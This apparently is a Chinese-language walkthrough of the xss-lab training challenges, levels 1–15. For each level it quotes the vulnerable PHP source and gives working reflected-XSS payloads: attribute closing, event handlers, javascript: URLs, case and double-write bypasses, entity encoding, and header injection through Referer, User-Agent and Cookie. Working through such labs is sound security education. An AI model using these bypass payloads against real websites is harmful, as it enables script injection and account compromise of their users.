# xss-lab

[https://xssaq.com/yx/](https://xssaq.com/yx/)

[https://blog.csdn.net/LYJ20010728/article/details/116462782](https://blog.csdn.net/LYJ20010728/article/details/116462782)

# level1

无阻碍

第一关

```html
https://xssaq.com/yx/level1.php?name=<script>alert(/redqx/)</script>
```

源码摘要

```php

<script>
window.alert = function()  //hook弹窗函数,也就是自定义了一个弹窗函数
{     
    confirm("完成的不错！");
    window.location.href="level2.php?keyword=test"; 
}

</script>

<?php 
ini_set("display_errors", 0); //这句代码用于设置PHP的错误报告级别，将其设为0表示不在页面上显示任何错误信息。
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>

```

其中存在漏洞利用点是echo

echo会把内容写到html中

如果内容涉及js代码,那么js代码就会被执行

比如下面这个东西

```php
<?php 
ini_set("display_errors", 0); //这句代码用于设置PHP的错误报告级别，将其设为0表示不在页面上显示任何错误信息。
$str = $_GET["name"];
//echo "<h2 align=center>欢迎用户".$str."</h2>";
echo "<script>alert(\"redqx\")</script>"
?>
```

于是就会有弹窗

![Untitled](xss-lab%2032cbdf3646914878b34975977f2cc833/Untitled.png)

所以,,,,对于源代码

```php
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

如果我们传入参数 $str = `<script>alert(\"redqx\")</script>`

echo就会触发一个弹窗

因为源代码自定义了弹窗函数

所以就会

```php
<script>
window.alert = function()  //hook弹窗函数,也就是自定义了一个弹窗函数
{     
    confirm("完成的不错！");
    window.location.href="level2.php?keyword=test"; 
}

</script>
```

在输入参数后,html代码就变为

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<h2 align=center>欢迎用户<script>alert(/redqx/)</script></h2><center><img src=level1.png></center>
<h3 align=center>payload的长度:31</h3></body>
</html>
```

# level2

标签闭合+ 事件

```php
"><script>alert(/redqx/)</script>

"> <img src='666' onerror=alert()> <"
"> <img src=666 onmouseout="alert()"> <"
"> <img src=1 onmouseover="alert()"> <"
"> <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+"> <"
```

![Untitled](xss-lab%2032cbdf3646914878b34975977f2cc833/Untitled%201.png)

源代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
```

其中得注意的一个东西是 `htmlspecialchars($str)`

htmlspecialchars($str)函数是一个PHP内置函数，用于将字符串中的特殊字符转换为HTML实体，

以避免XSS（跨站脚本攻击）等安全问题。具体来说，该函数会将以下字符转换为对应的HTML实体：

```php
&：转换为&amp;
"：转换为&quot;
'：转换为成为 '
<：转换为&lt;
>：转换为&gt;
```

转移之后,js代码就无法直接执行了

但是后面有一部分没有转义

```php
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
```

这个东西在html里面的展示效果就是(不变)

```php
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
```

value的值会被当作文本显示,尽管是js代码

所以我们要绕过value的限制

于是就提前闭合value,让js代码处在标签之外,页面之中

输入`"><script>alert('redqx')</script>`

其中`”>` 就是用于闭合 `<input name=keyword  value="'.$str.'">`

于是就变为了

```php
<input name=keyword  value="">'.$str.'
<input type=submit name=submit value="搜索"/>
```

页面代码

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<h2 align=center>没有找到和&quot;&gt;&lt;script&gt;alert(/redqx/)&lt;/script&gt;相关的结果.</h2><center>
<form action=level2.php method=GET>
<input name=keyword  value=""><script>alert(/redqx/)</script>">
<input type=submit name=submit value="搜索"/>
</form>
</center><center><img src=level2.png></center>
<h3 align=center>payload的长度:33</h3></body>
</html>
```

# level3

标签闭合+ 事件

```php
' onmouseover='alert(1)'><'
或者
' onmouseover='alert(1)
或者
'onclick='window.alert()
```

![Untitled](xss-lab%2032cbdf3646914878b34975977f2cc833/Untitled%202.png)

源码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>	
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```

首先,我们无法绕过`htmlspecialchars` 去立刻执行js代码

但是我们可以不绕过`htmlspecialchars` 而直接通过标签属性去触发一个js行为

比如这里根据特定的输入框标签去触发一个事件,该事件就是一个弹窗

事件属性 `onmouseover` 当鼠标移动到输入框的时候,触发的事件

```php
<input name=keyword  value='".htmlspecialchars($str)."'>
<input name=keyword  value='' onmouseover='alert(1)'> <''>
```

其中我们也需要去做一些标签的闭合,和空标签的构造

页面代码

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<h2 align=center>没有找到和' onmouseover='alert(1)相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value='' onmouseover='alert(1)'>
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level3.png></center>
<h3 align=center>payload的长度:23</h3></body>
</html>
```

# level4

标签闭合+ 事件

```php
" onclick="window.alert()
" oninput="alert('redqx')
其它:
" onmouseover='alert(1)'' 
" onfocus=javascript:alert('xss')//
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

首先有字符串<>的过滤

然后是htmlspecialchars的转移

所以漏洞点就只有

```php
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
```

所以还是level3的方法,但是之前闭合的是单引号

这一次需要闭合双引号

很奇怪也可以触发

```php
<input name=keyword  value="" onmouseover='alert(1)''">
<input type=submit name=submit value=搜索 />
```

为什么呢?

因为html是脚本语言

对于代码 `<input name=keyword  value="" onmouseover='alert(1)''">` 中 `onmouseover='alert(1)'` 已经闭合完毕了

然后代码`'">` 存在问题

但这不影响前面代码的执行

这就是脚本语言吧

下面这个东西也是利用脚本语言的漏洞

```php
<input name=keyword  value="" onfocus=javascript:alert('xss')//">
<input type=submit name=submit value=搜索 />
```

首先那个//是js的注释,把后面东西都给注释掉,然后就弹窗了

# level5

****javascript伪协议****

```php
"> <a href="javascript:alert('YYDS')">狂点我</a>

其它
"> <iframe src="javascript:alert('YYDS')"></iframe>
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

发现过滤了很多的on和script的一些东西

关于闭合什么的就不多说了

正常注入

```php
"> <a href="javascript:onclick=alert('redqx')">狂点我</a>
```

疑惑

```php
<input name=keyword  value=""> <a href="javascript:o_nclick=alert('redqx')">狂点我</a>">
<input type=submit name=submit value=搜索 />
```

为什么这个也可以弹窗呀

我的猜测: `onclick=alert('redqx')"` 意思就是变量(普通变量)的值就是函数`alert('redqx')` 

那么的话,我们也可以写 `"> <a href="javascript:redqx=alert('YYDS')">狂点我</a>`  于是有下面的代码

```php
<input name=keyword  value=""> <a href="javascript:redqx=alert('yyds')">狂点我</a>">
<input type=submit name=submit value=搜索 />
```

也可以实现弹窗

# level6

大小写绕过

```php
" Onclick="window.alert()
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

过滤了<script,on,src,data,href

但是忽略了大小写的一些东西

所以绕过大小写,再来个闭合,就会很简单

# level7

```php
" oonnclick="window.alert()
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

大小写绕过失败

script,on,src,data,href 过滤

但是可以双写绕过

# level8

[https://www.matools.com/code-convert-unicode](https://www.matools.com/code-convert-unicode)

```php
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#89;&#89;&#68;&#83;&#39;&#41;
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
```

过滤了很多东西,虽然可以双写绕过

但是又来了一个特殊字符转义

但是后来发现,就算换了一种编码unicode方式

htmlspecialchars也无法绕过

只是说可以绕过str_repalce

所以本levl的漏洞点变处在 `echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';`

所以我们要做的就是绕过strplace

因为href,我们刚好可以利用那个js的伪协议

`echo '<center><BR><a href="javascript:alert('YYDS')">友情链接</a></center>';`

# level9

答案是在level8的基础上添加原始字符串 `//http://`

```php
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#89;&#89;&#68;&#83;&#39;&#41;//http://
```

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
}
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

先字符串过滤

然后对于转义就没办法

后面有一个关键字的检测,必须含有http://

所以…

对js代码做一个编码.然后对检查字符用原始的字符,但是要通过js注释去取出语义

js的注释

```jsx
//
/**/
```

# level10

```php
?t_sort=" type="text" onclick="alert('redqx')"
?t_sort=" onclick="alert('redqx')" type="text"
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link" value="'.'" type="hidden">
<input name="t_history" value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

对keyword做了一个特殊字符转义,无法绕过

对t_sort做了<>字符串替换,可以通过编码绕过

# level11

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];//referer
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

可以发现, 能操作的部分就是 

变量 `$_SERVER['HTTP_REFERER']`  

用于获取HTTP请求来源的URL地址。具体来说，它将返回一个字符串，该字符串标识了用户从哪个页面链接到当前页面。

于是要操作的话,就需要通过抓包的行为

去修改字段 `HTTP_REFERER`

开启代理后,抓包

```php
GET /yx/level11.php HTTP/2
Host: xssaq.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

然后我们需要添加报文 构造 `Referer`

```php
Referer: " onclick="window.alert()" type="text"
```

于是

![Untitled](xss-lab%2032cbdf3646914878b34975977f2cc833/Untitled%203.png)

```php
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ref"  value="" onclick="window.alert()" type="text"" type="hidden">
```

# level12

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

存在漏洞的是 `str11=$_SERVER['HTTP_USER_AGENT'];`

于是一样的修改报文

和上一个情况是一样

上一关是Referer

这一关是user-_gent

![Untitled](xss-lab%2032cbdf3646914878b34975977f2cc833/Untitled%204.png)

# level13

代码摘要

```php
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

和上一个情况是一样

上一关是Referer,user_agent

这一关是Cookie

一样的修改报文

![Untitled](xss-lab%2032cbdf3646914878b34975977f2cc833/Untitled%205.png)

# level14

好像没啥东西

# level15

```php
'https://xssaq.com/yx/level1.php?name=<img src=0 onerror=alert(/redqx/)>'
```

代码摘要

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```

漏洞点有ng-include

**定义和用法**

**ng-include** 指令用于包含外部的 HTML 文件。

包含的内容将作为指定元素的子节点。

`ng-include` 属性的值可以是一个表达式，返回一个文件名。

默认情况下，包含的文件需要包含在同一个域名下。

---

**语法**

<*element* ng-include="*filename*" onload="*expression*" autoscroll="*expression*" ></*element*>

ng-include 指令作为元素使用:

<ng-include src="*filename*" onload="*expression*" autoscroll="*expression*" ></ng-include>

所有的 HTML 元素都支持该指令。

# 标签原始残缺

level4:

```php
" onmouseover='alert(1)''
" onfocus=javascript:alert('xss')>//
```

level5:

```php
"> <a href="javascript:alert(1)">
```

level10:

```php
?t_sort=" type="text" onclick="alert('redqx')"
```